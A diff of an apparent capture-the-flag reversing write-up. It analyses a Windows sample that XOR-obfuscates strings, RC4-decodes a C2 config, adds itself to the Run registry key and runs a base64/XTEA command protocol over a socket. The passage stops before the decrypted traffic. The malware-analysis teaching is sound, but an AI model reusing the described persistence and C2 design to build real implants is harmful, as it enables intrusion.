@@ -12,7 +12,7 @@ Tags: _rev_
 
 ## Solution
 
-This was a interesting reversing challenge with quite a couple of stages to jump over. The challenge comes with one `executable` file and one `network traffic capture`. Let's inspect the executable first, as we can assume the network traffic has to do something with the executable.
+This was an interesting reversing challenge, with quite a couple of stages to jump over. The challenge comes with one `executable` file and one `network traffic capture`. Let's inspect the executable first, as we can assume the network traffic has to do something with the executable.
 
 The main function is rather lengthy, so lets walk through it bit by bit:
 
@@ -39,7 +39,7 @@ The main function is rather lengthy, so lets walk through it bit by bit:
 140001000    }
 ```
 
-The first part is pretty common practice to avoid multiple instances of the same application running. The application creates a named `mutex` that has system wide visibility. Therefore, when another instance tries to create a mutex with the same name, this call will fail. The name is a rather crypting string that is passed into function `sub_1400013b0`. Lets have a quick look what this function does.
+The first part is pretty common practice to avoid multiple instances of the same application running. The application creates a named `mutex` that has system wide visibility. Therefore, when another instance tries to create a mutex with the same name, this call will fail. The name is a rather cryptic string that is passed into function `sub_1400013b0`. Lets have a quick look what this function does.
 
 ```c
 1400013b0    void* sub_1400013b0(char* arg1)
@@ -92,7 +92,7 @@ The first part is pretty common practice to avoid multiple instances of the same
 1400013b0    }
 ```
 
-The function is very simple, although it looks more scary on the first glance. It only takes a string as input and calculates an xor with `0x2f` on every character. The *scary* bit is doing the same thing, except on 32 byte blocks. A simplyfied* implementation would look like this:
+The function is actually very simple, although it looks more scary on the first glance. It takes a string as input and calculates an xor with `0x2f` on every character. The *scary* bit is doing the same thing, except on 32 byte blocks. A simplified* implementation would look like this:
 
 ```c
 int DeobfuscateString(const char* value, char* buffer)
@@ -109,43 +109,43 @@ int DeobfuscateString(const char* value, char* buffer)
 }
 ```
 
-*simplified as the original function creates a wide char (utf-16) string for windows api calls and has some simd optimizations.
+*simplified as the original function creates a widechar (utf-16) string for windows api calls and has some SIMD optimizations in place.
 
-We can now deobfuscate the name of the mutex ourself and get `CHERNYYKHOD`. Moving on with the main function.
+We can now deobfuscate the name of the mutex and get `CHERNYYKHOD` as a result. Moving on with the main function.
 
 ```c
 // ...
-14000106e                HMODULE hModule = GetModuleHandleW(nullptr);
-140001090                HRSRC hResInfo = FindResourceA(GetModuleHandleW(nullptr), "DATA", "CONFIG");
-140001090                
-14000109c                if (!hResInfo)
-14000132b                    std::ostream::operator<<(sub_140002ea0(std::cout, "Unable to decode config."), sub_140003070);
-14000109c                else
-14000109c                {
-1400010a8                    uint32_t count = SizeofResource(hModule, hResInfo);
-1400010b6                    HGLOBAL hResData = LoadResource(hModule, hResInfo);
-1400010b6                    
-1400010bf                    if (!hResData)
-14000132b                        std::ostream::operator<<(sub_140002ea0(std::cout, "Unable to decode config."), sub_140003070);
-1400010bf                    else
-1400010bf                    {
-1400010c8                        int64_t rax_6 = LockResource(hResData);
-1400010c8                        
-1400010dd                        if (!rax_6 || count < 0x42)
-14000132b                            std::ostream::operator<<(sub_140002ea0(std::cout, "Unable to decode config."), sub_140003070);
-1400010dd                        else
-1400010dd                        {
-1400010e5                            char* rax_7 = malloc((uint64_t)count);
-1400010f6                            memset(rax_7, 0, (uint64_t)count);
-140001104                            memcpy(rax_7, rax_6, count);
-14000110e                            sub_140001750(rax_7, count);
-140001113                            data_1400086f8 = rax_7;
+14000106e    HMODULE hModule = GetModuleHandleW(nullptr);
+140001090    HRSRC hResInfo = FindResourceA(GetModuleHandleW(nullptr), "DATA", "CONFIG");
+140001090    
+14000109c    if (!hResInfo)
+14000132b        std::ostream::operator<<(sub_140002ea0(std::cout, "Unable to decode config."), sub_140003070);
+14000109c    else
+14000109c    {
+1400010a8        uint32_t count = SizeofResource(hModule, hResInfo);
+1400010b6        HGLOBAL hResData = LoadResource(hModule, hResInfo);
+1400010b6        
+1400010bf        if (!hResData)
+14000132b            std::ostream::operator<<(sub_140002ea0(std::cout, "Unable to decode config."), sub_140003070);
+1400010bf        else
+1400010bf        {
+1400010c8            int64_t rax_6 = LockResource(hResData);
+1400010c8            
+1400010dd            if (!rax_6 || count < 0x42)
+14000132b                std::ostream::operator<<(sub_140002ea0(std::cout, "Unable to decode config."), sub_140003070);
+1400010dd            else
+1400010dd            {
+1400010e5                char* rax_7 = malloc((uint64_t)count);
+1400010f6                memset(rax_7, 0, (uint64_t)count);
+140001104                memcpy(rax_7, rax_6, count);
+14000110e                sub_140001750(rax_7, count);
+140001113                data_1400086f8 = rax_7;
 // ...
 ```
 
-This part reads a resource from the executable resource dictionary, copies the blob to a local buffer and calls `sub_140001750` on the buffer. As the name of the resource is `CONFIG/DATA` and the error message tell us `Unable to decode config` we can strongly assume this parts decodes a config structure, so we can also rename `sub_140001750` to `DecodeConfig`. 
+This part reads a resource from the executable resource dictionary, copies the blob to a local buffer and calls `sub_140001750` on that buffer. As the name of the resource is `CONFIG/DATA` plus the error message tell us `Unable to decode config` we can strongly assume this parts decodes some kind of config structure, so we can also rename `sub_140001750` to `DecodeConfig` for better readability. 
 
-The function is again rather lengthy, although the first part only deobfuscates a string (which results in `WHOANDWHEREISMYMASTER`) and converts the string from `wide-char` to `multi-byte` (basically utf-16 to utf-8).
+The function is again rather lengthy, although the first part only deobfuscates a string (which results in `WHOANDWHEREISMYMASTER`) and converts the string from `widechar` to `multibyte` (basically utf-16 to utf-8).
 
 ```c
 140001750    char* DecodeConfig(char* arg1, int32_t arg2)
@@ -171,23 +171,23 @@ Next the function creates a 256 byte wide table and assignes every index with th
 
 ```c
 /// ...
-1400017ff        int64_t i_2 = 0x100;
-140001806        char* rax_1 = j_operator new(0x100);
-140001818        memset(&rax_1[1], 0, 0xff);
-14000181d        int32_t r8_3 = 0;
-140001820        int32_t i = 0;
-140001822        char* rdx = rax_1;
-140001822        
-14000183a        do
-14000183a        {
-140001830            *(uint8_t*)rdx = i;
-140001832            rdx = &rdx[1];
-140001836            i += 1;
-14000183a        } while (i < 0x100);
+1400017ff    int64_t i_2 = 0x100;
+140001806    char* rax_1 = j_operator new(0x100);
+140001818    memset(&rax_1[1], 0, 0xff);
+14000181d    int32_t r8_3 = 0;
+140001820    int32_t i = 0;
+140001822    char* rdx = rax_1;
+140001822    
+14000183a    do
+14000183a    {
+140001830        *(uint8_t*)rdx = i;
+140001832        rdx = &rdx[1];
+140001836        i += 1;
+14000183a    } while (i < 0x100);
 /// ...
 ```
 
-This looks like a lookup table, or shuffle table and has the following structure after initialization:
+This looks like a lookup or shuffle table and has the following structure after initialization:
 
 ```bash
 lut[0] = 0
@@ -197,42 +197,42 @@ lut[2] = 2
 lut[255] = 255
 ```
 
-The second part of the initialization uses the deobfuscated string (stored in `lpMultiByteStr`) to shuffle around the entries in the table. We can assume that `lpMultiByteStr` is actually a hardcoded `key`. There is a bit of tricky logic in this loop that `BinaryNinja` fails to recognize properly. But offset `14000186b` - `14000187e` is basically only `r8_3 = (r8_3 + key[r10 % rcx_3] + r11_1) % 256`, very simple.
+The second part of the initialization uses the deobfuscated string (stored in `lpMultiByteStr`) to shuffle around the entries in the table. We can assume that `lpMultiByteStr` is actually a hardcoded `key`. There is a bit of tricky logic in this loop that `BinaryNinja` fails to recognize properly. But offset `14000186b` - `14000187e` is basically the same as `r8_3 = (r8_3 + key[r10 % rcx_3] + r11_1) % 256`.
 
 ```c
 /// ...
-14000183c        char* r9_1 = rax_1;
-14000183f        int64_t r10 = 0;
-140001899        char* result;
-140001899        int64_t i_1;
-140001899        
-140001899        do
-140001899        {
-140001842            uint32_t r11_1 = (uint32_t)*(uint8_t*)r9_1;
-140001846            int64_t rcx_3 = -1;
-140001846            
-140001857            do
-140001850                rcx_3 += 1;
-140001857             while (lpMultiByteStr[rcx_3]);
-140001857            
-14000186b            r8_3 = (r8_3 + (int32_t)lpMultiByteStr[COMBINE(0, r10) % rcx_3] + r11_1) & 0x800000ff;
-14000186b            
-140001872            if (r8_3 < 0)
-14000187e                r8_3 = ((r8_3 - 1) | 0xffffff00) + 1;
-14000187e            
-140001881            char* rcx_4 = (int64_t)r8_3;
-140001884            r10 += 1;
-140001887            result = (uint64_t)*(uint8_t*)(rcx_4 + rax_1);
-14000188b            *(uint8_t*)r9_1 = result;
-14000188e            r9_1 = &r9_1[1];
-140001891            *(uint8_t*)(rcx_4 + rax_1) = r11_1;
-140001895            i_1 = i_2;
-140001895            i_2 -= 1;
-140001899        } while (i_1 != 1);
+14000183c    char* r9_1 = rax_1;
+14000183f    int64_t r10 = 0;
+140001899    char* result;
+140001899    int64_t i_1;
+140001899    
+140001899    do
+140001899    {
+140001842        uint32_t r11_1 = (uint32_t)*(uint8_t*)r9_1;
+140001846        int64_t rcx_3 = -1;
+140001846        
+140001857        do
+140001850            rcx_3 += 1;
+140001857         while (lpMultiByteStr[rcx_3]);
+140001857        
+14000186b        r8_3 = (r8_3 + (int32_t)lpMultiByteStr[COMBINE(0, r10) % rcx_3] + r11_1) & 0x800000ff;
+14000186b        
+140001872        if (r8_3 < 0)
+14000187e            r8_3 = ((r8_3 - 1) | 0xffffff00) + 1;
+14000187e        
+140001881        char* rcx_4 = (int64_t)r8_3;
+140001884        r10 += 1;
+140001887        result = (uint64_t)*(uint8_t*)(rcx_4 + rax_1);
+14000188b        *(uint8_t*)r9_1 = result;
+14000188e        r9_1 = &r9_1[1];
+140001891        *(uint8_t*)(rcx_4 + rax_1) = r11_1;
+140001895        i_1 = i_2;
+140001895        i_2 -= 1;
+140001899    } while (i_1 != 1);
 /// ...
 ```
 
-The last part finally does the actual decoding. Simplify the `modulo 256` operations that BinaryNinja fails to recognize, the code is actually not hard to follow.
+The last part finally does the actual decoding. Mentally replace the `modulo 256` operations that BinaryNinja fails to recognize from the compiler output, the code is not that hard to follow anymore.
 
 ```c
 14000189b        int32_t rdx_3 = 0;
@@ -266,7 +266,7 @@ The last part finally does the actual decoding. Simplify the `modulo 256` operat
 140001750    }
 ```
 
-A cleaned up reipmplementation of the functionality looks like this:
+A cleaned up reimplementation of the functionality looks like this:
 
 ```c
 void DecodeConfig(uint8_t* data, int size)
@@ -303,11 +303,12 @@ void DecodeConfig(uint8_t* data, int size)
 }
 ```
 
-Wow, now we can decode the config. For this we need to extract the resource from the executable. We can use [`Resource Hacker`](https://www.angusj.com/resourcehacker/) for this.
+This is a [`stream cipher (RC4)`](https://en.wikipedia.org/wiki/RC4) that let's us decode the config. For this we need to extract the resource from the executable. We can use [`Resource Hacker`](https://www.angusj.com/resourcehacker/) for this.
 
 ![](img001.png)
 
 After loading and decoding the file, we get a `ip address`, a lot of null bytes and a `P`:
+
 ```bash
 192.168.138.67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x00
 ```
@@ -316,48 +317,48 @@ Good, lets move on with `main` again.
 
 ```c
 // ...
-14000111a                            uint8_t* lpData_1 = sub_140001530();
-140001127                            HKEY hKey_1;
-140001127                            
-140001127                            if (lpData_1)
-140001127                            {
-140001132                                hKey_1 = nullptr;
-140001132                                
-14000115b                                if (!RegOpenKeyExW(-0xffffffff80000001, u"Software\Microsoft\Windows\Curre…", 0, KEY_ALL_ACCESS, &hKey_1))
-14000115b                                {
-140001161                                    HKEY hKey = hKey_1;
-140001161                                    
-140001169                                    if (hKey)
-140001169                                    {
-140001174                                        int32_t var_1c8 = 0;
-140001178                                        int32_t* lpcbData = &var_1c8;
-140001185                                        uint8_t* lpData = nullptr;
-140001191                                        int32_t lpType = 1;
-140001191                                        
-1400011a2                                        if (RegQueryValueExW(hKey, u"Cherny", nullptr, &lpType, lpData, lpcbData) == ERROR_FILE_NOT_FOUND)
-1400011a2                                        {
-1400011a4                                            int64_t rax_10 = -1;
-1400011b9                                            bool cond:0_1;
-1400011b9                                            
-1400011b9                                            do
-1400011b9                                            {
-1400011b0                                                cond:0_1 = *(uint16_t*)(lpData_1 + (rax_10 << 1) + 2);
-1400011b5                                                rax_10 += 1;
-1400011b9                                            } while (cond:0_1);
-1400011c7                                            lpcbData = (int32_t)((rax_10 << 1) + 2);
-1400011e0                                            RegSetValueExW(hKey_1, u"Cherny", 0, REG_SZ, lpData_1, lpcbData);
-1400011a2                                        }
-1400011a2                                        
-1400011eb                                        CloseHandle(hKey_1);
-140001169                                    }
-14000115b                                }
-140001127                            }
+14000111a    uint8_t* lpData_1 = sub_140001530();
+140001127    HKEY hKey_1;
+140001127    
+140001127    if (lpData_1)
+140001127    {
+140001132        hKey_1 = nullptr;
+140001132        
+14000115b        if (!RegOpenKeyExW(-0xffffffff80000001, u"Software\Microsoft\Windows\Curre…", 0, KEY_ALL_ACCESS, &hKey_1))
+14000115b        {
+140001161            HKEY hKey = hKey_1;
+140001161            
+140001169            if (hKey)
+140001169            {
+140001174                int32_t var_1c8 = 0;
+140001178                int32_t* lpcbData = &var_1c8;
+140001185                uint8_t* lpData = nullptr;
+140001191                int32_t lpType = 1;
+140001191                
+1400011a2                if (RegQueryValueExW(hKey, u"Cherny", nullptr, &lpType, lpData, lpcbData) == ERROR_FILE_NOT_FOUND)
+1400011a2                {
+1400011a4                    int64_t rax_10 = -1;
+1400011b9                    bool cond:0_1;
+1400011b9                    
+1400011b9                    do
+1400011b9                    {
+1400011b0                        cond:0_1 = *(uint16_t*)(lpData_1 + (rax_10 << 1) + 2);
+1400011b5                        rax_10 += 1;
+1400011b9                    } while (cond:0_1);
+1400011c7                    lpcbData = (int32_t)((rax_10 << 1) + 2);
+1400011e0                    RegSetValueExW(hKey_1, u"Cherny", 0, REG_SZ, lpData_1, lpcbData);
+1400011a2                }
+1400011a2                
+1400011eb                CloseHandle(hKey_1);
+140001169            }
+14000115b        }
+140001127    }
 // ...
 ```
 
-This part is again very simple. It writes some value (coming from `sub_140001530`) to `\\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Cherny`. We know this by inspecting the [`RegOpenKeyExW`](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw) call, which takes a `hKey` as first parameter. There are a set of [`predefined key`](https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys) and by checking the `winreg.h` header we can see `HKEY_CURRENT_USER` corresponds to `0x80000001`. 
+This part is not too hard to follow. It writes some value (coming from `sub_140001530`) to `\\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Cherny`. We know this by inspecting the [`RegOpenKeyExW`](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw) call, which takes a `HKEY` as first parameter. There are a set of [`predefined key`](https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys) and by checking the `winreg.h` header we can see `HKEY_CURRENT_USER` corresponds to `0x80000001`. 
 
-Ok, enough of this excursion to the windows api. The [`Run Registry Key`](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys) is a typical place where things can be registered that need to be run after a user logged in. We can just assume the executable registers itself so it's started automatically again after the next user login. But validating is better than guessing, so we check the function `sub_140001530`.
+Ok, enough of this excursion to the windows API. The [`Run Registry Key`](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys) is a typical place where things can be registered that need to be run after a user logged in. We can just assume the executable registers itself so it's started automatically again after the next user login. But validating is better than guessing, so we check the function `sub_140001530`.
 
 ```c
 140001530    int64_t sub_140001530()
@@ -432,57 +433,57 @@ Ok, enough of this excursion to the windows api. The [`Run Registry Key`](https:
 140001530    }
 ```
 
-And yes, looks like we guessed right. The program searches for files with `exe` extension in the current working directory. If found it returns the working directory name plus the filename. 
+And yes, looks like we guessed about right. The program searches for files with `exe` extension in the current working directory. If found it returns the *working directory name* plus the *filename*. 
 
-> Also, one note at a side. The program really consequently leaks memory everywhere.
+> Also, one note at a side. The program really consequently leaks memory everywhere
 
-Lets move on to the last part of the main function. It's fairly straight foward. Initializing [`winsock`] by calling [`WSAStartup`](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup). Then creating a socket that uses the ip address and port from the decoded config, opening a connection to the socket, creating a buffer to read from the socket (and leaking memory again) and start reading from the socket.
+Lets move on to the last part of the main function. Initializing [`winsock`] by calling [`WSAStartup`](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup). Then creating a socket that uses the ip address and port from the decoded config, opening a connection to the socket, creating a buffer to read from the socket (and leaking memory again) and start reading from the socket.
 
 ```c
 /// ...
-1400011f4                            int64_t var_1d0_1 = 0;
-140001203                            __builtin_memset(&data_140008700, 0, 0x40);
-140001227                            void lpWSAData;
-140001227                            
-140001227                            if (!WSAStartup(0x202, &lpWSAData))
-140001227                            {
-140001239                                hKey_1 = 2;
-14000124f                                *(uint16_t*)((char*)hKey_1)[2] = htons(*(uint16_t*)(data_1400086f8 + 0x40));
-140001263                                *(uint32_t*)((char*)hKey_1)[4] = inet_addr(data_1400086f8);
-140001267                                SOCKET s = socket(2, SOCK_STREAM, 6);
-140001287                                int32_t i;
-140001287                                
-140001287                                do
-14000127e                                    i = connect(s, &hKey_1, 0x10);
-140001287                                 while (i == 0xffffffff);
-14000128e                                data_140008738 = s;
-140001295                                PSTR buf = malloc(0x400);
-1400012a9                                memset(buf, 0, 0x400);
-1400012a9                                
-1400012c9                                if (recv(data_140008738, buf, 0x400, 0))
-1400012c9                                {
-140001303                                    int32_t i_1;
-140001303                                    
-140001303                                    do
-140001303                                    {
-1400012d3                                        sub_1400020c0(buf);
-1400012e3                                        memset(buf, 0, 0x400);
-1400012fb                                        i_1 = recv(data_140008738, buf, 0x400, 0);
-140001303                                    } while (i_1);
-1400012c9                                }
-1400012c9                                
-14000132b                                std::ostream::operator<<(sub_140002ea0(std::cout, "Socket closed gracefully."), sub_140003070);
-140001227                            }
-1400010dd                        }
-1400010bf                    }
-14000109c                }
-14000109c                
-14000135e                __security_check_cookie(rax_1 ^ &var_208);
-14000136a                return 0;
+1400011f4                int64_t var_1d0_1 = 0;
+140001203                __builtin_memset(&data_140008700, 0, 0x40);
+140001227                void lpWSAData;
+140001227                
+140001227                if (!WSAStartup(0x202, &lpWSAData))
+140001227                {
+140001239                    hKey_1 = 2;
+14000124f                    *(uint16_t*)((char*)hKey_1)[2] = htons(*(uint16_t*)(data_1400086f8 + 0x40));
+140001263                    *(uint32_t*)((char*)hKey_1)[4] = inet_addr(data_1400086f8);
+140001267                    SOCKET s = socket(2, SOCK_STREAM, 6);
+140001287                    int32_t i;
+140001287                    
+140001287                    do
+14000127e                        i = connect(s, &hKey_1, 0x10);
+140001287                     while (i == 0xffffffff);
+14000128e                    data_140008738 = s;
+140001295                    PSTR buf = malloc(0x400);
+1400012a9                    memset(buf, 0, 0x400);
+1400012a9                    
+1400012c9                    if (recv(data_140008738, buf, 0x400, 0))
+1400012c9                    {
+140001303                        int32_t i_1;
+140001303                        
+140001303                        do
+140001303                        {
+1400012d3                            sub_1400020c0(buf);
+1400012e3                            memset(buf, 0, 0x400);
+1400012fb                            i_1 = recv(data_140008738, buf, 0x400, 0);
+140001303                        } while (i_1);
+1400012c9                    }
+1400012c9                    
+14000132b                    std::ostream::operator<<(sub_140002ea0(std::cout, "Socket closed gracefully."), sub_140003070);
+140001227                }
+1400010dd            }
+1400010bf        }
+14000109c    }
+14000109c    
+14000135e    __security_check_cookie(rax_1 ^ &var_208);
+14000136a    return 0;
 /// ...
 ```
 
-The data coming through the socket is passed to `sub_1400020c0`, which would be the next part to look at. This is some long piece of code, so we only look at the important parts, because major parts are not needed.
+The data coming through the socket is passed to `sub_1400020c0`, which will be the next part to look at. This is some long piece of code, so we only look at the important parts here, as  major parts are not needed to solve this challenge.
 
 ```c
 1400020c0    HANDLE sub_1400020c0(char* arg1)
@@ -522,39 +523,39 @@ The data coming through the socket is passed to `sub_1400020c0`, which would be 
 // ...
 ```
 
-First the function taked the input buffer, calculates the length of the buffer. If the buffer contains an line break (`\n = 0xa`) as last character, it replaces the character with a string terminator (`\0`) and recalculates the length again.
+First, the function takes the input buffer and calculates the length of the buffer. If the buffer contains a line break (`\n = 0xa`) as last character, it replaces the character with a string terminator (`\0`) and recalculates the length again.
 
 ```c
 // ...
-14000213c        int64_t var_118 = 0;
-140002146        int64_t var_120 = 0;
-14000214b        int32_t* var_128 = &var_f8;
-140002154        CryptStringToBinaryA();
-14000215a        int32_t rcx = var_f8;
-14000215e        uint64_t _Size = (uint64_t)(rcx + 1);
-14000215e        
-140002161        if (rcx >= 0xffffffff)
-140002161            _Size = -1;
-140002161        
-140002165        char* rax_4 = malloc(_Size);
-14000217b        memset(rax_4, 0, (uint64_t)(var_f8 + 1));
-140002180        int64_t rdx_1 = -1;
-140002180        
-14000218a        do
-140002183            rdx_1 += 1;
-14000218a         while (arg1[rdx_1]);
-14000218a        
-1400021ac        CryptStringToBinaryA(arg1, rdx_1, 1, rax_4, &var_f8, 0, 0);
+14000213c    int64_t var_118 = 0;
+140002146    int64_t var_120 = 0;
+14000214b    int32_t* var_128 = &var_f8;
+140002154    CryptStringToBinaryA();
+14000215a    int32_t rcx = var_f8;
+14000215e    uint64_t _Size = (uint64_t)(rcx + 1);
+14000215e    
+140002161    if (rcx >= 0xffffffff)
+140002161        _Size = -1;
+140002161    
+140002165    char* rax_4 = malloc(_Size);
+14000217b    memset(rax_4, 0, (uint64_t)(var_f8 + 1));
+140002180    int64_t rdx_1 = -1;
+140002180    
+14000218a    do
+140002183        rdx_1 += 1;
+14000218a     while (arg1[rdx_1]);
+14000218a    
+1400021ac    CryptStringToBinaryA(arg1, rdx_1, 1, rax_4, &var_f8, 0, 0);
 // ...
 ```
 
-Then the function uses [`CryptStringToBinaryA`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya) to `base64` decode the input buffer. The two call approach is quite common with some winapi functionality. The first call is used to get the output buffer length.
+Then the function uses [`CryptStringToBinaryA`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya) to `base64` decode the input buffer. The *two call approach* is quite common with some winapi functionality. The first call is used to get the output buffer length.
 
 > A pointer to a buffer that receives the returned sequence of bytes. If this parameter is NULL, the function calculates the length of the buffer needed and returns the size, in bytes, of required memory in the DWORD pointed to by pcbBinary.
 
-The second call *has* a valid pointer set to `pbBinary` and returns the decoded value to this buffer (also, the buffer leaks again here). `dwFlags` is set to `1` that corresponds to `CRYPT_STRING_BASE64`, therefore we know the input is assumed to be `base64 encoded`.
+The second call *has* a valid pointer set to `pbBinary` and returns the decoded value to this buffer (also, the program leaks memory again here). `dwFlags` is set to `1` that corresponds to `CRYPT_STRING_BASE64`, therefore we know the input is assumed to be `base64 encoded`.
 
-Then the function checks the first byte of the decoded payload. It differenciates between `D` and `E`. In case it's a `D` the remaining part of the payload is tokenized with an `|` as delimiter (`0x7c`). The first token is stored in `rbx_1` and the second token (that is the rest after the first split) is stored in `lbBuffer`. In case of `E` it does the same, but calls `sub_1400019f0` on the remaining payload before tokenizing.
+Then the function checks the first byte of the decoded payload. It differenciates between `D` and `E`. In case it's an `D` the remaining part of the payload is tokenized with a `|` as delimiter (`0x7c`). The first token is stored in `rbx_1` and the second token (that is the rest after the first split) is stored in `lbBuffer`. In case of `E` it does the same, but calls `sub_1400019f0` on the remaining payload before tokenizing.
 
 ```c
 /// ...
@@ -613,34 +614,34 @@ Then the function checks the first byte of the decoded payload. It differenciate
 1400020c0    }
 ```
 
-Then the function calculates the length of the first token. If it's less or zero 0 it sends back `Invalid Command\n` to the server. So we can assume that the first token is some sort of command that the server can invoke on the client and the remaining part might be command parameters.
+Then the function calculates the length of the first token. If it's less than, or zero 0 it sends back `Invalid Command\n` to the server. So we can assume that the first token is some sort of command that the server can invoke on the client and the remaining part might be command parameters.
 
 ```c
 // ...
-140002250            uint64_t i_1 = (uint64_t)rax_10;
-140002270            uint64_t i;
-140002270            
-140002270            do
-140002270            {
-140002260                result = (uint64_t)(int32_t)*(uint8_t*)rbx_1;
-140002263                rbx_1 = &rbx_1[1];
-14000226a                rcx_6 = RORD(rcx_6, 0xd) + result;
-14000226c                i = i_1;
-14000226c                i_1 -= 1;
-140002270            } while (i != 1);
+140002250    uint64_t i_1 = (uint64_t)rax_10;
+140002270    uint64_t i;
+140002270    
+140002270    do
+140002270    {
+140002260        result = (uint64_t)(int32_t)*(uint8_t*)rbx_1;
+140002263        rbx_1 = &rbx_1[1];
+14000226a        rcx_6 = RORD(rcx_6, 0xd) + result;
+14000226c        i = i_1;
+14000226c        i_1 -= 1;
+140002270    } while (i != 1);
 140002270
-140002278            if (rcx_6 == 0xd49a66b)
-14000227a                data_1400086f0 = lpBuffer;
-140002278            else
-140002278            {
+140002278    if (rcx_6 == 0xd49a66b)
+14000227a        data_1400086f0 = lpBuffer;
+140002278    else
+140002278    {
 // ...
-140002278            }
+140002278    }
 // ...
 ```
 
-Then the function calculates a hash of the command, and the rest is a fairly straight forward switch-case construct that invokes certain functionality based on the command that is sent.
+Then the function calculates a hash of the command and consumes it in a big switch-case construct that invokes certain functionality based on the command that was sent.
 
-So, we are that far in analyzing the binary. Lets have a look at the network traffic capture. We know the server ip `192.168.138.67`, so we can filter the events down already a bit in wireshark (filter `(ip.dst==192.168.138.67 || ip.src==192.168.138.67) && tcp.port==80`).
+So, we are that far in analyzing the binary. Let's have a look at the network traffic capture. We know the server ip `192.168.138.67` and the port `80`, so we can filter the events down a bit in wireshark (filter `(ip.dst==192.168.138.67 || ip.src==192.168.138.67) && tcp.port==80`).
 
 If we follow this TCP stream we get:
 
@@ -662,7 +663,7 @@ C:\Users\saura\data>
 <server> RSPPpIhlKGAsCmnkR3kD+uD5g30DH199VGWitl4BFgiF7LhZMn4GWFDRIh1agXJSpaR7Fxcm+fFl 
 ```
 
-So, let's have a look at the first message that comes from the server `REtFWUVYQ0h8RU5DUllQVFRSQUZGSUswNw`. If we decode this we have `DKEYEXCH|ENCRYPTTRAFFIK07`. The first byte is the marker that decides to call `sub_1400019f0` on the payload or not. Here we have `D` so the rest of the payload is plaintext, as we can observe here. Then the application would split the payload at `|`, giving us the command `KEYEXCH` and the parameter `ENCRYPTTRAFFIK07`. 
+So, let's have a look at the first message that comes from the server `REtFWUVYQ0h8RU5DUllQVFRSQUZGSUswNw`. If we decode this we get `DKEYEXCH|ENCRYPTTRAFFIK07`. The first byte is the marker that decides to call `sub_1400019f0` on the payload or not. Here we have `D` so the rest of the payload is plaintext, as we can also observe here. Then the application would split the payload at `|`, giving us the command `KEYEXCH` and the parameter `ENCRYPTTRAFFIK07`. 
 
 ```py
 def ror(value, bits):
@@ -676,14 +677,14 @@ def hash(value):
     return result
 ```
 
-If we create the hash for the command we get `0xd49a66b`. We already saw this in the decompiled code. This sets the key to whatever the server sends, probably for future encrypted traffic.
+If we create the hash for the command we get `0xd49a66b`. We already saw this in the decompiled code. This sets the a global variable to whatever the server sends, probably a `key` for future encrypted traffic.
 
 ```c
-140002278            if (rcx_6 == 0xd49a66b)
-14000227a                data_1400086f0 = lpBuffer;
+140002278    if (rcx_6 == 0xd49a66b)
+14000227a        data_1400086f0 = lpBuffer;
 ```
 
-The rest of the messages actually seems to be encrypted. If we base64 decode them we get only type markers plus some bytes.
+The rest of the messages actually seems to be encrypted. If we base64 decode them we get only type markers plus some rather meaningles bytes.
 
 ```bash
 $ echo "RS1J1SxUJcq0y6CmpvlFHTUxUub0NrsRb96TEwoWI5GFR0RM/jkk9ZA="|base64 -d
@@ -691,7 +692,7 @@ E-I�,T%ʴˠ���E51R��6�oޓ
 #��GDL�9$��
 ```
 
-Ok, we need to see how we can decrypt the data. We know the key at least. Our best bet is `sub_1400019f0` that is uses for `E` typed messages. Lets look into it.
+Ok, we need to see how we can decrypt the data. We know the key at least. Our best bet is `sub_1400019f0` that is used for `E` typed messages. Lets look into it.
 
 ```c
 1400019f0    int32_t* sub_1400019f0(void* arg1, int32_t arg2)
@@ -776,44 +777,83 @@ Ok, we need to see how we can decrypt the data. We know the key at least. Our be
 1400019f0    }
 ```
 
-This looks scary... But we can do a bit of research and google for some of the constants. We pretty quickly find this must be a implementation of [`XTEA`](https://en.wikipedia.org/wiki/XTEA), so nothing custom made. Thats good, so we maaaaybe can ship around analyzing this code in detail by just using a premade implementation. I used a [`Online XTEA Decrypt`](https://www.tools4noobs.com/online_tools/xtea_decrypt/) that was able to decrypt most (except of one) of the messages.
+This looks scary... But we can do a bit of research and google for some of the constants. We pretty quickly find this must be an implementation of [`XTEA`](https://en.wikipedia.org/wiki/XTEA), so nothing custom made. We can use a tool to decrypt the messages, or look up some implementation:
+
+```c
+#define ROUNDS 32
+
+void XteaDecrypt(uint32_t key[4], uint8_t* block) 
+{
+    uint32_t v0, v1;
+
+    READ_U32BE(v0, block, 0);
+    READ_U32BE(v1, block, 4);
+
+    uint32_t delta = 0x9E3779B9, sum = delta * ROUNDS;
+
+    for (int i = 0; i < ROUNDS; i++) 
+    {
+        v1 = v1 - ((v0 << 4 ^ v0 >> 5) + v0 ^ sum + key[(sum >> 11) & 3]);
+        sum = sum - delta;
+        v0 = v0 - ((v1 << 4 ^ v1 >> 5) + v1 ^ sum + key[sum & 3]);
+    }
+
+    WRITE_U32BE(v0, block, 0);
+    WRITE_U32BE(v1, block, 4);
+}
+
+void DecryptDataInplace(uint8_t* encryptedData, size_t encryptedDataLength, uint8_t key[16])
+{
+    uint32_t keystream[4];
+    for (int i = 0; i < 4; i++) {
+        READ_U32BE(keystream[i], key, i * 4);
+    }
+
+    const size_t numBlocks = encryptedDataLength / 8;
+    
+    for (size_t i = 0; i < numBlocks; i++) {
+        XteaDecrypt(keystream, encryptedData + i * 8);
+    }
+```
 
 So here's the decrypted traffic:
 
 ```bash
